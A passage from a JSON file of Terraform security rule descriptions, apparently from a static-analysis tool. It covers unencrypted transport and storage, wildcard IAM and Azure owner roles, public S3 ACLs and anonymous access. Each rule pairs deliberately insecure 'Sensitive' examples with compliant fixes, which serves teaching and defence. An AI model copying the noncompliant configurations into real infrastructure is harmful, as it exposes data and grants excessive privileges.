        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://aws.amazon.com/kinesis/\">AWS Kinesis</a> Data Streams server-side encryption:</p>\n<pre>\nresource \"aws_kinesis_stream\" \"sensitive_stream\" {\n    encryption_type = \"NONE\" # Sensitive\n}\n</pre>\n<p>For <a href=\"https://aws.amazon.com/elasticache/\">Amazon ElastiCache</a>:</p>\n<pre>\nresource \"aws_elasticache_replication_group\" \"example\" {\n    replication_group_id = \"example\"\n    replication_group_description = \"example\"\n    transit_encryption_enabled = false  # Sensitive\n}\n</pre>\n<p>For <a href=\"https://aws.amazon.com/ecs/\">Amazon ECS</a>:</p>\n<pre>\nresource \"aws_ecs_task_definition\" \"ecs_task\" {\n  family = \"service\"\n  container_definitions = file(\"task-definition.json\")\n\n  volume {\n    name = \"storage\"\n    efs_volume_configuration {\n      file_system_id = aws_efs_file_system.fs.id\n      transit_encryption = \"DISABLED\"  # Sensitive\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/opensearch-service/index.html\">Amazon OpenSearch domains</a>:</p>\n<pre>\nresource \"aws_elasticsearch_domain\" \"example\" {\n  domain_name = \"example\"\n  domain_endpoint_options {\n    enforce_https = false # Sensitive\n  }\n  node_to_node_encryption {\n    enabled = false # Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://aws.amazon.com/msk/\">Amazon MSK</a> communications between clients and brokers:</p>\n<pre>\nresource \"aws_msk_cluster\" \"sensitive_data_cluster\" {\n    encryption_info {\n        encryption_in_transit {\n            client_broker = \"TLS_PLAINTEXT\" # Sensitive\n            in_cluster = false # Sensitive\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Load Balancer Listeners</a>:</p>\n<pre>\nresource \"aws_lb_listener\" \"front_load_balancer\" {\n  protocol = \"HTTP\" # Sensitive\n\n  default_action {\n    type = \"redirect\"\n\n    redirect {\n      protocol = \"HTTP\"\n    }\n  }\n}\n</pre>\n<p>HTTP protocol is used for <a\nhref=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_region_backend_service\">GCP Region Backend\nServices</a>:</p>\n<pre>\nresource \"google_compute_region_backend_service\" \"example\" {\n  name                            = \"example-service\"\n  region                          = \"us-central1\"\n  health_checks                   = [google_compute_region_health_check.region.id]\n  connection_draining_timeout_sec = 10\n  session_affinity                = \"CLIENT_IP\"\n  load_balancing_scheme           = \"EXTERNAL\"\n  protocol                        = \"HTTP\" # Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://aws.amazon.com/kinesis/\">AWS Kinesis</a> Data Streams server-side encryption:</p>\n<pre>\nresource \"aws_kinesis_stream\" \"compliant_stream\" {\n    encryption_type = \"KMS\"\n}\n</pre>\n<p>For <a href=\"https://aws.amazon.com/elasticache/\">Amazon ElastiCache</a>:</p>\n<pre>\nresource \"aws_elasticache_replication_group\" \"example\" {\n    replication_group_id = \"example\"\n    replication_group_description = \"example\"\n    transit_encryption_enabled = true\n}\n</pre>\n<p>For <a href=\"https://aws.amazon.com/ecs/\">Amazon ECS</a>:</p>\n<pre>\nresource \"aws_ecs_task_definition\" \"ecs_task\" {\n  family = \"service\"\n  container_definitions = file(\"task-definition.json\")\n\n  volume {\n    name = \"storage\"\n    efs_volume_configuration {\n      file_system_id = aws_efs_file_system.fs.id\n      transit_encryption = \"ENABLED\"\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/opensearch-service/index.html\">Amazon OpenSearch domains</a>:</p>\n<pre>\nresource \"aws_elasticsearch_domain\" \"example\" {\n  domain_name = \"example\"\n  domain_endpoint_options {\n    enforce_https = true\n  }\n  node_to_node_encryption {\n    enabled = true\n  }\n}\n</pre>\n<p>For <a href=\"https://aws.amazon.com/msk/\">Amazon MSK</a> communications between clients and brokers, data in transit is encrypted by default,\nallowing you to omit writing the <code>encryption_in_transit</code> configuration. However, if you need to configure it explicitly, this configuration\nis compliant:</p>\n<pre>\nresource \"aws_msk_cluster\" \"sensitive_data_cluster\" {\n    encryption_info {\n        encryption_in_transit {\n            client_broker = \"TLS\"\n            in_cluster = true\n        }\n    }\n}\n</pre>\n<p>For <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Load Balancer Listeners</a>:</p>\n<pre>\nresource \"aws_lb_listener\" \"front_load_balancer\" {\n  protocol = \"HTTP\"\n\n  default_action {\n    type = \"redirect\"\n\n    redirect {\n      protocol = \"HTTPS\"\n    }\n  }\n}\n</pre>\n<p>HTTPS protocol is used for <a\nhref=\"https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_region_backend_service\">GCP Region Backend\nServices</a>:</p>\n<pre>\nresource \"google_compute_region_backend_service\" \"example\" {\n  name                            = \"example-service\"\n  region                          = \"us-central1\"\n  health_checks                   = [google_compute_region_health_check.region.id]\n  connection_draining_timeout_sec = 10\n  session_affinity                = \"CLIENT_IP\"\n  load_balancing_scheme           = \"EXTERNAL\"\n  protocol                        = \"HTTPS\"\n}\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "terraform:S6303": {
        "name": "Using unencrypted RDS DB resources is security-sensitive",
        "htmlDesc": "<p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br> This includes database data, logs, automatic backups, read replicas,\nsnapshots, and cluster metadata.</p>\n<p>This situation can occur in a variety of scenarios, such as:</p>\n<ul>\n  <li> A malicious insider working at the cloud provider gains physical access to the storage device. </li>\n  <li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li>\n</ul>\n<p>After a successful intrusion, the underlying applications are exposed to:</p>\n<ul>\n  <li> theft of intellectual property and/or personal data </li>\n  <li> extortion </li>\n  <li> denial of services and security bypasses via data corruption or deletion </li>\n</ul>\n<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br> In any case, no further maintenance is\nrequired as encryption at rest is fully managed by AWS.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance\">aws_db_instance</a> and <a\nhref=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster\">aws_rds_cluster</a>:</p>\n<pre>\nresource \"aws_db_instance\" \"example\" {\n  storage_encrypted = false # Sensitive, disabled by default\n}\n\nresource \"aws_rds_cluster\" \"example\" {\n  storage_encrypted = false # Sensitive, disabled by default\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance\">aws_db_instance</a> and <a\nhref=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster\">aws_rds_cluster</a>:</p>\n<pre>\nresource \"aws_db_instance\" \"example\" {\n  storage_encrypted = true\n}\n\nresource \"aws_rds_cluster\" \"example\" {\n  storage_encrypted = true\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html\">AWS Documentation</a> - Encrypting Amazon RDS\n  resources </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6388": {
        "name": "Using unencrypted cloud storages is security-sensitive",
        "htmlDesc": "<p>Using unencrypted cloud storages can lead to data exposure. In the case that adversaries gain physical access to the storage medium they are able\nto access unencrypted information.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The service contains sensitive information that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt cloud storages that contain sensitive information.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store\">azurerm_data_lake_store</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"azurerm_data_lake_store\" \"store\" {\n  name             = \"store\"\n  encryption_state = \"Disabled\"  # Sensitive\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store\">azurerm_data_lake_store</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"azurerm_data_lake_store\" \"store\" {\n  name             = \"store\"\n  encryption_state = \"Enabled\"\n  encryption_type  = \"ServiceManaged\"\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/efs/latest/ug/encryption.html\">Data encryption in Amazon EFS</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/backup/backup-encryption\">Encryption in Azure Backup</a> </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/mysql/single-server/concepts-security\">Security in Azure Database for MySQL</a> </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/postgresql/single-server/concepts-security\">Security in Azure Database for PostgreSQL</a>\n  </li>\n  <li> <a href=\"https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable?tabs=portal\">Infrastructure double encryption\n  of data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6302": {
        "name": "Policies granting all privileges are security-sensitive",
        "htmlDesc": "<p>A policy that grants all permissions may indicate an improper access control, which violates <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity is granted full\npermissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources\nmay occur and therefore result in loss of information.</p>\n<h2>Ask Yourself Whether</h2>\n<p>Identities obtaining all the permissions:</p>\n<ul>\n  <li> only require a subset of these permissions to perform the intended function. </li>\n  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start\nwith the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in\nproduction, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>\n<h2>Sensitive Code Example</h2>\n<p>A customer-managed policy for AWS that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>\n<pre>\nresource \"aws_iam_policy\" \"example\" {\n  name = \"noncompliantpolicy\"\n\n  policy = jsonencode({\n    Version   = \"2012-10-17\"\n    Statement = [\n      {\n        Action   = [\n          \"*\" # Sensitive\n        ]\n        Effect   = \"Allow\"\n        Resource = [\n          aws_s3_bucket.mybucket.arn\n        ]\n      }\n    ]\n  })\n}\n</pre>\n<p>A customer-managed policy for GCP that grants all permissions by using the actions admin role <code>role</code> property:</p>\n<pre>\nresource \"google_project_iam_binding\" \"example\" {\n  project = \"example\"\n  role    = \"roles/owner\" # Sensitive\n\n  members = [\n    \"user:jane@example.com\",\n  ]\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>A customer-managed policy for AWS that grants only the required permissions:</p>\n<pre>\nresource \"aws_iam_policy\" \"example\" {\n  name = \"compliantpolicy\"\n\n  policy = jsonencode({\n    Version   = \"2012-10-17\"\n    Statement = [\n      {\n        Action   = [\n          \"s3:GetObject\"\n        ]\n        Effect   = \"Allow\"\n        Resource = [\n          aws_s3_bucket.mybucket.arn\n        ]\n      }\n    ]\n  })\n}\n</pre>\n<p>A customer-managed policy for GCP that grants restricted permissions by using the actions admin role <code>role</code> property:</p>\n<pre>\nresource \"google_project_iam_binding\" \"example\" {\n  project = \"example\"\n  role    = \"roles/actions.Viewer\"\n\n  members = [\n    \"user:jane@example.com\",\n  ]\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> <a href=\"https://cloud.google.com/iam/docs/understanding-roles\">Google Cloud Documentation</a> - Understanding roles </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "terraform:S6308": {
        "name": "Using unencrypted Elasticsearch domains is security-sensitive",
        "htmlDesc": "<p>Amazon Elasticsearch Service (ES) is a managed service to host Elasticsearch instances.</p>\n<p>To harden domain (cluster) data in case of unauthorized access, ES provides data-at-rest encryption if the Elasticsearch version is 5.1 or above.\nEnabling encryption at rest will help protect:</p>\n<ul>\n  <li> indices </li>\n  <li> logs </li>\n  <li> swap files </li>\n  <li> data in the application directory </li>\n  <li> automated snapshots </li>\n</ul>\n<p>Thus, if adversaries gain physical access to the storage medium, they cannot access the data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to encrypt Elasticsearch domains that contain sensitive information.</p>\n<p>Encryption and decryption are handled transparently by ES, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain\">aws_elasticsearch_domain</a>:</p>\n<pre>\nresource \"aws_elasticsearch_domain\" \"elasticsearch\" {\n  encrypt_at_rest {\n    enabled = false  # Sensitive, disabled by default\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticsearch_domain\">aws_elasticsearch_domain</a>:</p>\n<pre>\nresource \"aws_elasticsearch_domain\" \"elasticsearch\" {\n  encrypt_at_rest {\n    enabled = true\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html\">AWS Documentation</a> - Encryption of\n  data at rest for Amazon Elasticsearch Service </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6385": {
        "name": "Azure custom roles should not grant subscription Owner capabilities",
        "htmlDesc": "<p>Defining a custom role at the <code>Subscription</code> or <code>Management group</code> scope that allows all actions will give it the same\ncapabilities as the built-in <code>Owner</code> role.</p>\n<h2>Why is this an issue?</h2>\n<p>In Azure, the <code>Owner</code> role of a <code>Subscription</code> or a <code>Management group</code> provides entities it is assigned to with\nthe maximum level of privileges. The <code>Owner</code> role allows managing all resources and assigning any role to other entities.</p>\n<p>Because it is a powerful entitlement, it should be granted to as few users as possible.</p>\n<p>When a custom role has the same level of permissions as the <code>Owner</code> one, there are greater chances that high privileges are granted to\ntoo many users.</p>\n<h3>What is the potential impact?</h3>\n<p>Custom roles that provide the same level of permissions as <code>Owner</code> might indicate a configuration issue. Any entity assigned with it can\nperform any action on the <code>Subscription</code> or <code>Management group</code>, including changing roles and permissions.</p>\n<p>If the affected role is unexpectedly assigned to users, they can compromise the affected scope. They can do so in the long term by assigning\ndangerous roles to other users or entities.</p>\n<p>Depending on the scope to which the role is assignable, the exact impact of a successful exploitation may vary. It generally ranges from data\ncompromise to the takeover of the cloud infrastructure.</p>\n<h4>Infrastructure takeover</h4>\n<p>By obtaining the right role, an attacker can gain control over part or all of the Azure infrastructure. They can modify DNS settings, redirect\ntraffic, or launch malicious instances that can be used for various nefarious activities, including launching DDoS attacks, hosting phishing websites,\nor distributing malware. Malicious instances may also be used for resource-intensive tasks such as cryptocurrency mining.</p>\n<p>This can result in legal liability, but also increased costs, degraded performance, and potential service disruptions.</p>\n<p>Furthermore, corporate Azure infrastructures are often connected to other services and to the internal networks of the organization. Because of\nthis, cloud infrastructure is often used by attackers as a gateway to other assets. Attackers can leverage this gateway to gain access to more\nservices, to compromise more business-critical data, and to cause more damage to the overall infrastructure.</p>\n<h4>Compromise of sensitive data</h4>\n<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers with the correct role\ncould be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity theft, financial loss, or\nother negative outcomes.</p>\n<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>\n<h4>Financial loss</h4>\n<p>Financial losses can occur when a malicious user is able to use a paid third-party-provided service. Each users assigned with a bad role will be\nable to use it without limit to use the third party service to their own need, including in a way that was not expected.</p>\n<p>This additional use will lead to added costs with the Azure service provider.</p>\n<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected\nenvironment. This might result in a partial denial of service for all legitimate users.</p>\n<h2>How to fix it</h2>\n<p>To reduce the risk of intrusion of a compromised owner, it is recommended to limit the number of subscription owners.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"azurerm_role_definition\" \"example\" { # Sensitive\n  name        = \"example\"\n  scope       = data.azurerm_subscription.primary.id\n\n  permissions {\n    actions     = [\"*\"]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id\n  ]\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nresource \"azurerm_role_definition\" \"example\" {\n  name        = \"example\"\n  scope       = data.azurerm_subscription.primary.id\n\n  permissions {\n    actions     = [\"Microsoft.Compute/*\"]\n    not_actions = []\n  }\n\n  assignable_scopes = [\n    data.azurerm_subscription.primary.id\n  ]\n}\n</pre>\n<h3>Going the extra mile</h3>\n<p>Here is a list of recommendations that can be followed regarding good usage of roles:</p>\n<ul>\n  <li> Apply the least privilege principle by creating a custom role with as few permissions as possible. </li>\n  <li> As custom roles can be updated, gradually add atomic permissions when required. </li>\n  <li> Limit the assignable scopes of the custom role to a set of Resources or Resource Groups. </li>\n  <li> When necessary, use the built-in Owner role instead of a custom role granting subscription owner capabilities. </li>\n  <li> Limit the assignments of Owner roles to less than three people or service principals. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Azure Documentation - <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/custom-roles\">Azure custom roles</a> </li>\n  <li> Azure Documentation - <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices\">Best practices for Azure\n  RBAC</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6387": {
        "name": "Azure role assignments that grant access to all resources of a subscription are security-sensitive",
        "htmlDesc": "<p>Azure RBAC roles can be assigned to users, groups, or service principals. A role assignment grants permissions on a predefined set of resources\ncalled \"scope\".</p>\n<p>The widest scopes a role can be assigned to are:</p>\n<ul>\n  <li> Subscription: a role assigned with this scope grants access to all resources of this Subscription. </li>\n  <li> Management Group: a scope assigned with this scope grants access to all resources of all the Subscriptions in this Management Group. </li>\n</ul>\n<p>In case of security incidents involving a compromised identity (user, group, or service principal), limiting its role assignment to the narrowest\nscope possible helps separate duties and limits what resources are at risk.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The user, group, or service principal doesn’t use the entirety of the resources in the scope to operate on a day-to-day basis. </li>\n  <li> It is possible to follow the Separation of Duties principle and split the scope into multiple role assignments with a narrower scope. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Limit the scope of the role assignment to a Resource or Resource Group. </li>\n  <li> Apply the least privilege principle by assigning roles granting as few permissions as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nresource \"azurerm_role_assignment\" \"example\" {\n  scope                = data.azurerm_subscription.primary.id # Sensitive\n  role_definition_name = \"Reader\"\n  principal_id         = data.azuread_user.user.object_id\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nresource \"azurerm_role_assignment\" \"example\" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = \"Reader\"\n  principal_id         = data.azuread_user.user.object_id\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/scope-overview\">Azure Documentation</a> - Understand scope for Azure\n  RBAC </li>\n  <li> <a href=\"https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices\">Azure Documentation</a> - Best practices for Azure\n  RBAC </li>\n</ul>",
        "severity": "MAJOR"
      },
      "terraform:S6265": {
        "name": "Granting access to S3 buckets to all or authenticated users is security-sensitive",
        "htmlDesc": "<p>Predefined permissions, also known as <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">canned ACLs</a>,\nare an easy way to grant large privileges to predefined groups or users.</p>\n<p>The following canned ACLs are security-sensitive:</p>\n<ul>\n  <li> <code>PublicRead</code>, <code>PublicReadWrite</code> grant respectively \"read\" and \"read and write\" privileges to everyone in the world\n  (<code>AllUsers</code> group). </li>\n  <li> <code>AuthenticatedRead</code> grants \"read\" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to implement the least privilege policy, ie to grant necessary permissions only to users for their required tasks. In the context\nof canned ACL, set it to <code>private</code> (the default one) and if needed more granularity then use an appropriate S3 policy.</p>\n<h2>Sensitive Code Example</h2>\n<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>public-read-write</code> access\ncontrol:</p>\n<pre>\nresource \"aws_s3_bucket\" \"mynoncompliantbucket\" { # Sensitive\n  bucket = \"mynoncompliantbucketname\"\n  acl    = \"public-read-write\"\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>With the <code>private</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>\n<pre>\nresource \"aws_s3_bucket\" \"mycompliantbucket\" { # Compliant\n  bucket = \"mycompliantbucketname\"\n  acl    = \"private\"\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl\">AWS Documentation</a> - Access control list (ACL)\n  overview (canned ACLs) </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html\">AWS Documentation</a> - Controlling access to a bucket with\n  user policies </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "terraform:S6380": {
        "name": "Authorizing anonymous access to Azure resources is security-sensitive",
        "htmlDesc": "<p>Allowing anonymous access can reduce an organization’s ability to protect itself against attacks on its Azure resources.</p>\n<p>Security incidents may include disrupting critical functions, data theft, and additional Azure subscription costs due to resource overload.</p>\n<p>Using authentication coupled with fine-grained authorizations helps bring defense-in-depth and bring traceability to investigators of security\nincidents.</p>\n<p>Depending on the affected Azure resource, multiple authentication choices are possible: Active Directory Authentication, OpenID implementations\n(Google, Microsoft, etc.) or native Azure mechanisms.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This Azure resource is essential for the information system infrastructure. </li>\n  <li> This Azure resource is essential for mission-critical functions. </li>\n  <li> This Azure resource stores or processes sensitive data. </li>\n  <li> Compliance policies require access to this resource to be authenticated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Enable authentication in this Azure resource, and disable anonymous access.</p>\n<p>If only Basic Authentication is available, enable it.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/app-service/\">App Services and equivalent</a>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nresource \"azurerm_function_app\" \"example\" {\n  name = \"example\"\n\n  auth_settings {\n    enabled = false # Sensitive\n  }\n\n  auth_settings {\n    enabled = true\n    unauthenticated_client_action = \"AllowAnonymous\" # Sensitive\n  }\n}\n</pre>\n<p>For <a href=\"https://azure.microsoft.com/en-us/services/api-management/\">API Management</a>:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nresource 